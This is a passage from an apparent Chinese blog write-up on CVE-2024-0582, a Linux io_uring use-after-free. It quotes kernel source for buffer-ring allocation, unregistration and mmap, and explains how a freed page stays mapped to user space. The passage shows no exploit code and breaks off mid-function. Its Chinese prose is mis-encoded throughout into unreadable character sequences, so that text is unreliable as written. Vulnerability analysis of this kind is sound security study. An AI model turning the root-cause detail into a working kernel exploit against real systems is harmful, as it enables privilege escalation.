class="hljs-keyword">endif</span></span><br>    <span class="hljs-comment">/* reserved for Red Hat */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __GENKSYMS__</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rh_reserved[<span class="hljs-number">2</span>];<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    <span class="hljs-comment">/* How many tasks sharing this mm are OOM_DISABLE */</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rh_reserved_aux;<br>        <span class="hljs-type">atomic_t</span> oom_disable_count;<br>    &#125;;<br><br>    <span class="hljs-comment">/* base of lib map area (ASCII armour) */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> shlib_base;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><h5 id="4-è™šæ‹Ÿåœ°å€åˆ°çœŸå®é¡µï¼ˆPFN-struct-page-PTEï¼‰ä¹‹é—´çš„å…³ç³»ï¼ˆæµç¨‹ä¸å·®å¼‚ï¼‰"><a href="#4-è™šæ‹Ÿåœ°å€åˆ°çœŸå®é¡µï¼ˆPFN-struct-page-PTEï¼‰ä¹‹é—´çš„å…³ç³»ï¼ˆæµç¨‹ä¸å·®å¼‚ï¼‰" class="headerlink" title="4) è™šæ‹Ÿåœ°å€åˆ°çœŸå®é¡µï¼ˆPFN &#x2F; struct page &#x2F; PTEï¼‰ä¹‹é—´çš„å…³ç³»ï¼ˆæµç¨‹ä¸å·®å¼‚ï¼‰"></a>4) è™šæ‹Ÿåœ°å€åˆ°çœŸå®é¡µï¼ˆPFN &#x2F; struct page &#x2F; PTEï¼‰ä¹‹é—´çš„å…³ç³»ï¼ˆæµç¨‹ä¸å·®å¼‚ï¼‰</h5><p>ä¸‹é¢æ˜¯å‡ ç±»å¸¸è§æ˜ å°„æ–¹å¼ä¸å·®åˆ«ï¼š</p><p>A. æ–‡ä»¶&#x2F;é¡µç¼“å­˜ï¼ˆfile-backedï¼‰æ˜ å°„ï¼ˆå¸¸è§ï¼‰</p><ul><li><p>åœ¨ç¼ºé¡µæ—¶ï¼Œå†…æ ¸ä» page cache æ‰¾ struct pageï¼ˆæˆ–ä»ç£ç›˜è¯»å…¥å¹¶åˆ†é… struct pageï¼‰ï¼Œç„¶åæŠŠ struct page çš„ PFN æ’å…¥åˆ°é¡µè¡¨ï¼ˆPTEï¼‰ï¼ŒåŒæ—¶å¢åŠ  page çš„å¼•ç”¨è®¡æ•°ï¼ˆrefcountï¼‰ã€‚</p></li><li><p>è¿™ç§æ˜ å°„ä¼šæŠŠ struct page ä¸ PTE ç»‘å®šï¼Œå¹¶ä¸” struct page çš„ç”Ÿå‘½å‘¨æœŸï¼ˆrefcountï¼‰ä¼šä¿æŠ¤é¡µé¢åœ¨å†…æ ¸å¯¹è±¡ä¸­ä¸èƒ½è¢«é”™è¯¯é‡Šæ”¾ã€‚</p></li></ul><p>B. åŒ¿åï¼ˆzero-on-demandï¼‰æ˜ å°„</p><ul><li>åœ¨ç¼ºé¡µæ—¶ï¼Œå†…æ ¸åˆ†é…ä¸€ä¸ªæ–°çš„ struct pageï¼ˆæ¸…é›¶æˆ–æŒ‰é…ç½®ï¼‰ï¼ŒæŠŠå®ƒæ’å…¥ PTEï¼Œå¹¶å¢åŠ  refcountã€‚å’Œ file-backed ç±»ä¼¼ï¼ŒPTE çš„å­˜åœ¨å’Œ struct page çš„å¼•ç”¨ç»´ç³»ç€é¡µé¢ä¸è¢«é‡Šæ”¾ã€‚</li></ul><p>C. é©±åŠ¨æˆ–å†…æ ¸ä¸»åŠ¨æ˜ å°„ï¼ˆ<code>remap_pfn_range() / vm_insert_page() / vm_insert_pages()</code>ï¼‰</p><ul><li><p><code>remap_pfn_range(vma, addr, pfn, size, prot)</code>ï¼šæŠŠä¸€æ®µ<strong>è¿ç»­çš„ç‰©ç†å¸§(pfn)</strong> ç›´æ¥æ˜ å°„åˆ°ç”¨æˆ·è™šæ‹Ÿåœ°å€åŒºé—´ï¼ˆç”¨ä½œè®¾å¤‡å†…å­˜ã€DMA å†…å­˜æˆ–å†…æ ¸åˆ†é…çš„ç‰©ç†é¡µï¼‰ã€‚å®ƒæ˜¯â€œå°† PFN å†™è¿› PTEâ€å¹¶æŠŠè¿™äº› PTE æ ‡ä¸Šé€‚å½“çš„è®¿é—®ä½&#x2F;ç¼“å­˜ä½ï¼ˆä¾‹å¦‚è®¾ç½® VM_PFNMAP æ ‡å¿—ï¼‰ã€‚<code>remap_pfn_range()</code> çš„è¯­ä¹‰æ˜¯â€œæŠŠè¿™ä¸ªç‰©ç†å¸§èŒƒå›´æš´éœ²ç»™ç”¨æˆ·â€ã€‚</p></li><li><p>å…³é”®ç‚¹ï¼š<strong>remap_pfn_range() æœ¬èº«å¹¶ä¸è‡ªåŠ¨ä¸ºæ¯ä¸ª PFN å¢åŠ å¯¹åº”çš„ struct page çš„å¼•ç”¨è®¡æ•°</strong>ï¼ˆå› ä¸ºå®ƒåŸºäº PFN è€Œé struct pageï¼Œä¸”ç»å¸¸ç”¨äºæ˜ å°„è®¾å¤‡å†…å­˜æˆ–åŒ¿å kernel memoryï¼‰ã€‚å› æ­¤è¿™ç§æ˜ å°„ä¸ä¼šåƒâ€œpage-cache çš„ fault è·¯å¾„â€é‚£æ ·éšå¼åœ°ä¿æŠ¤ struct page çš„ç”Ÿå‘½å‘¨æœŸã€‚StackOverflow ä¸Šä¹Ÿæœ‰è®¨è®ºè¯´æ˜ remap_pfn_range() æ˜¯æŠŠç‰©ç† PFN ç›´æ¥æ˜ å°„åˆ°ç”¨æˆ·ç©ºé—´ã€‚</p></li><li><p><code>vm_insert_page() / vm_insert_pages()</code>ï¼šè¿™äº›æ¥å£ä»¥ <code>struct page *</code> ä¸ºå•ä½æ’å…¥é¡µè¡¨ï¼Œå¹¶<strong>é€šå¸¸ä¼š</strong>å¢åŠ è¯¥é¡µçš„å¼•ç”¨è®¡æ•°ï¼ˆå› æ­¤èƒ½ä¿è¯é¡µé¢åœ¨æ˜ å°„æœŸé—´ä¸ä¼šè¢«é‡Šæ”¾ï¼‰ã€‚è®¸å¤šé©±åŠ¨&#x2F;å­ç³»ç»Ÿåœ¨éœ€è¦â€œé¡µè¢« VMA ä¿æŒå¼•ç”¨â€æ—¶æ”¹ç”¨è¿™äº›æ¥å£ã€‚ç¤¾åŒºä¹Ÿæœ‰æå‡ºæŠŠ <code>remap_pfn_range()</code> çš„ä½¿ç”¨æ›¿æ¢ä¸º <code>vm_insert_pages()</code> çš„è¡¥ä¸æ¥é¿å…ç”Ÿå‘½å‘¨æœŸé—®é¢˜ã€‚</p></li><li><p><code>remap_pfn_range()</code> &#x3D; â€œæŠŠç‰©ç†å¸§å·å†™å…¥é¡µé¢è¡¨ï¼ˆPTEï¼‰â€ï¼Œä½†ä¸è‡ªåŠ¨æŠŠâ€œæ‹¥æœ‰æƒâ€äº¤ç»™æ˜ å°„ï¼›</p></li><li><p><code>vm_insert_page()</code> &#x3D; â€œæŠŠ page å¯¹è±¡è¿åˆ° PTEï¼Œå¹¶æŠŠè¿™ä¸ª page çš„å¼•ç”¨è®¡æ•° +1â€ï¼Œå› æ­¤æ˜ å°„åŒæ—¶â€œæ‹¥æœ‰â€è¯¥é¡µã€‚</p></li></ul><p>å†…æ ¸è‹¥åœ¨æŸå¤„ï¼ˆä¾‹å¦‚ unregisterï¼‰æ‰§è¡Œ <code>put_page_testzero(page) â†’ free_compound_page(page)</code>ï¼Œä¸”è¯¥ put å°† <code>refcount</code> å‡åˆ° 0ï¼Œå†…æ ¸ä¼šæŠŠç‰©ç†é¡µäº¤è¿˜ç»™ä¼™ä¼´ç³»ç»Ÿï¼ˆfreeï¼‰ã€‚ä½† VMA&#x2F;PTE ä»ç„¶å­˜åœ¨ï¼Œç”¨æˆ·è™šæ‹Ÿåœ°å€ä»ç„¶æ˜ å°„åˆ°é‚£ä¸ªç›¸åŒçš„ PFNï¼ˆé¡µè¡¨æ¡ç›®æ²¡æœ‰è¢«è‡ªåŠ¨æ¸…æ‰ï¼‰ã€‚è¿™å°±æ˜¯â€œæ˜ å°„ä»åœ¨ï¼Œä½†å†…æ ¸è®¤ä¸ºé¡µå·² freeâ€â€”â€”é¡µé¢å†…å®¹ä¼šè¢«åç»­åˆ†é…æ–°ç”¨é€”è¦†ç›–ï¼Œä»è€Œå‡ºç°<strong>è¯»å†™ä»»æ„è¢«æ–°åˆ†é…å¯¹è±¡çš„å†…å­˜</strong>ï¼ˆä¸¥é‡ UAFï¼‰ã€‚è¿™ä¸€ç‚¹æ­£æ˜¯ CVE-2024-0582 çš„æœ¬è´¨ã€‚</p><h3 id="æ¼æ´è§¦å‘åŸå› "><a href="#æ¼æ´è§¦å‘åŸå› " class="headerlink" title="æ¼æ´è§¦å‘åŸå› "></a>æ¼æ´è§¦å‘åŸå› </h3><h5 id="pbufå†…å­˜åˆ†é…"><a href="#pbufå†…å­˜åˆ†é…" class="headerlink" title="pbufå†…å­˜åˆ†é…"></a><code>pbuf</code>å†…å­˜åˆ†é…</h5><p>è¿™é‡Œæœ‰ä¸€ä¸ªå…³é”®æ ‡å¿—ï¼š<code>IOU_PBUF_RING_MMAP</code>ï¼šå¦‚æœç½®ä½ï¼Œ<strong>ring çš„å†…å­˜ç”±å†…æ ¸åˆ†é…</strong>ï¼Œéšå<strong>ç”¨æˆ·ç”¨ mmap()</strong> åˆ°è‡ªå·±çš„åœ°å€ç©ºé—´æ¥è®¿é—®&#x2F;å¡«å…… ring å…ƒæ•°æ®ï¼ˆhead&#x2F;tail&#x2F;entries ç­‰ï¼‰ï¼›æ²¡ç½®ä½åˆ™è¡¨ç¤º<strong>ç”¨æˆ·è‡ªæœ‰é¡µ</strong>è¢« pin è¿›æ¥ã€‚</p><p>![[Pasted image 20250819110146.png]]</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_buf_reg</span> &#123;</span><br>__u64ring_addr; <span class="hljs-comment">//ç¯åœ°å€</span><br>__u32ring_entries; <span class="hljs-comment">//æ¡ç›®æ•°</span><br>__u16bgid; <span class="hljs-comment">//ç¼“å†²åŒºid</span><br>__u16flags; <span class="hljs-comment">//æ ‡å¿—ä½</span><br>__u64resv[<span class="hljs-number">3</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªç»“æ„ä½“ä¸­å­˜åœ¨ä¸€ä¸ª<code>flags</code>ç»“æ„ï¼Œç”¨äºåˆ¤æ–­è¯¥ç¼“å†²åŒºçš„åˆ†é…æ–¹å¼ã€‚<br>(1)<code>io_pin_pbuf_ring(&amp;reg, bl)</code></p><ul><li>è§¦å‘æ¡ä»¶ï¼š<strong>æ²¡æœ‰è®¾ç½® IOU_PBUF_RING_MMAP</strong>ã€‚</li><li>é€»è¾‘ï¼š<ol><li><code>reg.ring_addr</code> æŒ‡å‘ç”¨æˆ·ç©ºé—´å·²æœ‰å†…å­˜ã€‚    </li><li>å†…æ ¸è°ƒç”¨ <code>io_pin_pages()</code> â†’ å®é™…ä¸Šè°ƒç”¨ <code>pin_user_pages()</code>ï¼ŒæŠŠè¿™æ®µç”¨æˆ·å†…å­˜ <code>pin</code> ä½ï¼ˆç¦æ­¢æ¢å‡ºï¼Œä¿è¯ DMA&#x2F;IO æ—¶æœ‰æ•ˆï¼‰ã€‚</li><li>å¾—åˆ° <code>struct page *</code> æ•°ç»„ï¼Œå»ºç«‹ <code>bl-&gt;buf_ring</code> æŒ‡é’ˆæŒ‡å‘è¿™ç‰‡ç”¨æˆ·å†…å­˜ã€‚<br>(2)<code>io_alloc_pbuf_ring(&amp;reg, bl)</code></li></ol></li><li>è§¦å‘æ¡ä»¶ï¼š<strong>è®¾ç½®äº† IOU_PBUF_RING_MMAP</strong>ã€‚</li><li>é€»è¾‘ï¼š<ol><li>å†…æ ¸è‡ªå·±åˆ†é…ä¸€å—è¿ç»­ç‰©ç†å†…å­˜ï¼ˆé€šè¿‡ alloc_pages()ï¼Œé€šå¸¸æ˜¯å¤åˆé¡µï¼‰ã€‚</li><li>bl-&gt;buf_ring æŒ‡å‘è¿™å—å†…æ ¸åˆ†é…çš„å†…å­˜ã€‚</li><li>è®¾ç½® bl-&gt;is_mmap &#x3D; 1ï¼Œè¡¨ç¤ºè¿™å—å†…å­˜åç»­è¦å…è®¸ç”¨æˆ·é€šè¿‡ mmap() æ˜ å°„ã€‚</li></ol></li><li>ç”¨æˆ·æ¥ä¸‹æ¥è°ƒç”¨ <code>mmap() â†’ io_uring_mmap() â†’ remap_pfn_range()</code>ï¼ŒæŠŠè¿™å—ç‰©ç†é¡µç›´æ¥æ˜ å°„åˆ°ç”¨æˆ·ç©ºé—´ã€‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">io_alloc_pbuf_ring</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> io_uring_buf_reg *reg,</span><br><span class="hljs-params">      <span class="hljs-keyword">struct</span> io_buffer_list *bl)</span><br>&#123;<br><span class="hljs-type">gfp_t</span> gfp = GFP_KERNEL_ACCOUNT | __GFP_ZERO | __GFP_NOWARN | __GFP_COMP;<br><span class="hljs-type">size_t</span> ring_size;<br><span class="hljs-type">void</span> *ptr;<br><br>ring_size = reg-&gt;ring_entries * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> io_uring_buf_ring);<br>ptr = (<span class="hljs-type">void</span> *) __get_free_pages(gfp, get_order(ring_size));<br><span class="hljs-keyword">if</span> (!ptr)<br><span class="hljs-keyword">return</span> -ENOMEM;<br><br>bl-&gt;buf_ring = ptr;<br>bl-&gt;is_mapped = <span class="hljs-number">1</span>;<br>bl-&gt;is_mmap = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ç¡®å®šç”¨æˆ·ä»¥<code>mmap</code>æ–¹å¼æ˜ å°„å†…å­˜åï¼Œé€šè¿‡<code>__get_free_pages</code>è·å¾—å†…å­˜é¡µï¼Œåˆ†é…äº†å¤åˆé¡µã€‚å¾—åˆ°çš„ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br>![[Pasted image 20250819120627.png]]</p><h5 id="å†…å­˜æ¸…ç†"><a href="#å†…å­˜æ¸…ç†" class="headerlink" title="å†…å­˜æ¸…ç†"></a>å†…å­˜æ¸…ç†</h5><p>æœ‰å†…å­˜çš„åˆ›å»ºï¼Œå°±ä¼šæœ‰å†…å­˜çš„æ¸…ç†ï¼Œå¯¹åº”<code>opcode</code>ä¸º<code>IORING_UNREGISTER_PBUF_RING</code>ï¼Œåœ¨å¦‚ä¸‹å‡½æ•°ä¸­æ“ä½œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">io_unregister_pbuf_ring</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> io_ring_ctx *ctx, <span class="hljs-type">void</span> __user *arg)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_buf_reg</span> <span class="hljs-title">reg</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_buffer_list</span> *<span class="hljs-title">bl</span>;</span><br><br><span class="hljs-keyword">if</span> (copy_from_user(&amp;reg, arg, <span class="hljs-keyword">sizeof</span>(reg)))<br><span class="hljs-keyword">return</span> -EFAULT;<br><span class="hljs-keyword">if</span> (reg.resv[<span class="hljs-number">0</span>] || reg.resv[<span class="hljs-number">1</span>] || reg.resv[<span class="hljs-number">2</span>])<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">if</span> (reg.flags)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>bl = io_buffer_get_list(ctx, reg.bgid);<br><span class="hljs-keyword">if</span> (!bl)<br><span class="hljs-keyword">return</span> -ENOENT;<br><span class="hljs-keyword">if</span> (!bl-&gt;is_mapped)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>__io_remove_buffers(ctx, bl, <span class="hljs-number">-1U</span>);<br><span class="hljs-keyword">if</span> (bl-&gt;bgid &gt;= BGID_ARRAY) &#123;<br>xa_erase(&amp;ctx-&gt;io_bl_xa, bl-&gt;bgid);<br>kfree(bl);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°çš„æ ¸å¿ƒé€»è¾‘æ˜¯ï¼š</p><ul><li>é¦–å…ˆå°†ç¼“å†²åŒºä»ç”¨æˆ·ç¼“å†²åŒºå¤åˆ¶åˆ°å†…æ ¸ï¼Œç„¶åå¯¹å…¶å‚æ•°åšä¸€äº›æ£€æŸ¥ã€‚</li><li>éšåä»åˆšåˆšæ‹·è´å¾—åˆ°çš„å†…å®¹ï¼Œé€šè¿‡<code>io_buffer_get_list</code>å¾—åˆ°å¯¹åº”çš„<code>io_buffer_list</code>ï¼ˆç¼“å†²åŒºåˆ—è¡¨ï¼‰</li><li>ç„¶åå†æ ¹æ®è¿™ä¸ªåˆ—è¡¨ï¼Œè°ƒç”¨<code>__io_remove_buffers</code>å‡½æ•°å¯¹ç¼“å†²åŒºè¿›è¡Œæ¸…ç†ã€‚<br>æ¥ç€çœ‹è¿™ä¸ªå‡½æ•°ï¼š</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __io_remove_buffers(<span class="hljs-keyword">struct</span> io_ring_ctx *ctx,<br>       <span class="hljs-keyword">struct</span> io_buffer_list *bl, <span class="hljs-type">unsigned</span> nbufs)<br>&#123;<br><span class="hljs-type">unsigned</span> i = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">/* shouldn&#x27;t happen */</span><br><span class="hljs-keyword">if</span> (!nbufs)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (bl-&gt;is_mapped) &#123;<br>i = bl-&gt;buf_ring-&gt;tail - bl-&gt;head;<br><span class="hljs-keyword">if</span> (bl-&gt;is_mmap) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-comment">// æŠŠ `bl-&gt;buf_ring` çš„è™šæ‹Ÿé¡µé¢è½¬æ¢æˆçœŸå®çš„ç‰©ç†é¡µé¢</span><br>page = virt_to_head_page(bl-&gt;buf_ring);<br><span class="hljs-comment">// é¡µé¢å¼•ç”¨è®¡æ•°å‰ªä¸€ï¼Œå¦‚æœå¼•ç”¨è®¡æ•°ä¸º0ï¼Œåˆ™freeæ‰è¯¥é¡µé¢</span><br><span class="hljs-keyword">if</span> (put_page_testzero(page))<br>free_compound_page(page);<br><span class="hljs-comment">// å°†`buf_list`çš„ç¼“å†²ç¯å’Œmmapæ ‡å¿—æ¸…ç©º</span><br>bl-&gt;buf_ring = <span class="hljs-literal">NULL</span>;<br>bl-&gt;is_mmap = <span class="hljs-number">0</span>;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (bl-&gt;buf_nr_pages) &#123;<br><span class="hljs-type">int</span> j;<br><br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; bl-&gt;buf_nr_pages; j++)<br>unpin_user_page(bl-&gt;buf_pages[j]);<br>kvfree(bl-&gt;buf_pages);<br>bl-&gt;buf_pages = <span class="hljs-literal">NULL</span>;<br>bl-&gt;buf_nr_pages = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">/* make sure it&#x27;s seen as empty */</span><br>INIT_LIST_HEAD(&amp;bl-&gt;buf_list);<br>bl-&gt;is_mapped = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">return</span> i;<br>&#125;<br><br><span class="hljs-comment">/* protects io_buffers_cache */</span><br>lockdep_assert_held(&amp;ctx-&gt;uring_lock);<br><br><span class="hljs-keyword">while</span> (!list_empty(&amp;bl-&gt;buf_list)) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_buffer</span> *<span class="hljs-title">nxt</span>;</span><br><br>nxt = list_first_entry(&amp;bl-&gt;buf_list, <span class="hljs-keyword">struct</span> io_buffer, <span class="hljs-built_in">list</span>);<br>list_move(&amp;nxt-&gt;<span class="hljs-built_in">list</span>, &amp;ctx-&gt;io_buffers_cache);<br><span class="hljs-keyword">if</span> (++i == nbufs)<br><span class="hljs-keyword">return</span> i;<br>cond_resched();<br>&#125;<br><br><span class="hljs-keyword">return</span> i;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”±äºæˆ‘ä»¬ç°åœ¨åªè€ƒè™‘<code>mmap</code>çš„æƒ…å†µï¼Œæ‰€ä»¥ä¸€å®šä¼šè¿›å…¥<code>if</code>ä»£ç å—ã€‚å¯¹<code>bl-&gt;ring</code>è°ƒç”¨äº†å‡½æ•°<code>virt_to_head_page</code>ï¼Œå°†è™šæ‹Ÿåœ°å€æ¢æˆçœŸå®é¡µé¢ï¼ˆå¤åˆé¡µé¢ï¼‰ï¼ˆç”¨äº†å‡½æ•°<code>virt_to_page</code>)ï¼Œå¹¶ä¸”å¾—åˆ°å…¶é¦–é¡µåœ°å€ï¼ˆ<code>compound_head_fast</code>)ã€‚é¡µé¢å¼•ç”¨è®¡æ•°å‰ªä¸€ã€‚å¦‚æœå¼•ç”¨è®¡æ•°ä¸º0ï¼Œç›´æ¥ç”¨<code>free_compound_page</code>é‡Šæ”¾ã€‚</p><p>è¿™é‡Œä¼šå°†<code>bl-&gt;buf_ring</code>å’Œ<code>bl-&gt;im_mmap</code>ç›´æ¥ç½®ç©ºï¼Œä½†æ˜¯ç”¨æˆ·å¯¹è¯¥â€é¡µâ€ä»ç„¶æ‹¥æœ‰mmapçš„èƒ½åŠ›ï¼Œå³è¿˜èƒ½å¤Ÿå¯¹è¯¥é¡µé¢è¿›è¡Œè¯»&#x2F;å†™ã€‚è¿™å°±æ˜¯æˆ‘ä»¬åœ¨<code>mmap</code>é‡Œè®²åˆ°ï¼š<code>remap_pfn_range()</code>åé‡Šæ”¾å†…å­˜é¡µï¼Œä½†æ²¡æœ‰å»æ‰ç”¨æˆ·å¯¹è¯¥é¡µé¢çš„<code>mmap</code>èƒ½åŠ›å¯¼è‡´çš„<code>UAF</code>ã€‚<br>s</p><h5 id="io-uring-mmap"><a href="#io-uring-mmap" class="headerlink" title="io_uring_mmap()"></a><code>io_uring_mmap()</code></h5><p>ä¸Šé¢çš„åŸç†ææ¸…æ¥šï¼Œä½†æ˜¯<code>mmap</code>è°ƒç”¨äº†<code>remap_pfn_range()</code>äº†å˜›ï¼Ÿæˆ‘ä»¬æ¥ä¸‹æ¥å…·ä½“çœ‹ä¸€ä¸‹ç”¨æˆ·æ˜¯å¦‚ä½•å¯¹åˆ†é…åˆ°çš„é¡µï¼ˆ<code>pbuf</code>ç¼“å†²åŒºï¼‰è¿›è¡Œè¯»å†™çš„ï¼š</p><p><code>io_uring</code>ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ä¸ªéå¸¸æ–¹ä¾¿çš„å‡½æ•°ï¼š<code>io_uring_mmap()</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __cold <span class="hljs-type">int</span> <span class="hljs-title function_">io_uring_mmap</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-keyword">struct</span> vm_area_struct *vma)</span><br>&#123;<br><span class="hljs-type">size_t</span> sz = vma-&gt;vm_end - vma-&gt;vm_start;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> pfn;<br><span class="hljs-type">void</span> *ptr;<br><br>ptr = io_uring_validate_mmap_request(file, vma-&gt;vm_pgoff, sz);<br><span class="hljs-keyword">if</span> (IS_ERR(ptr))<br><span class="hljs-keyword">return</span> PTR_ERR(ptr);<br><br>pfn = virt_to_phys(ptr) &gt;&gt; PAGE_SHIFT;<br><span class="hljs-keyword">return</span> remap_pfn_range(vma, vma-&gt;vm_start, pfn, sz, vma-&gt;vm_page_prot);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>io_uring_validate_mmap_request()</code>è¿™ä¸ªå‡½æ•°å®Œæˆäº†ä»€ä¹ˆå·¥ä½œï¼Ÿ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">io_uring_validate_mmap_request</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file,</span><br><span class="hljs-params">    <span class="hljs-type">loff_t</span> pgoff, <span class="hljs-type">size_t</span> sz)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_ring_ctx</span> *<span class="hljs-title">ctx</span> =</span> file-&gt;private_data;<br><span class="hljs-type">loff_t</span> offset = pgoff &lt;&lt; PAGE_SHIFT;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">void</span> *ptr;<br><br><span class="hljs-keyword">switch</span> (offset &amp; IORING_OFF_MMAP_MASK) &#123;<br><span class="hljs-keyword">case</span> IORING_OFF_SQ_RING:<br><span class="hljs-keyword">case</span> IORING_OFF_CQ_RING:<br>ptr = ctx-&gt;rings;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> IORING_OFF_SQES:<br>ptr = ctx-&gt;sq_sqes;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> IORING_OFF_PBUF_RING: &#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> bgid;<br><br>bgid = (offset &amp; ~IORING_OFF_MMAP_MASK) &gt;&gt; IORING_OFF_PBUF_SHIFT;<br>mutex_lock(&amp;ctx-&gt;uring_lock);<br>ptr = 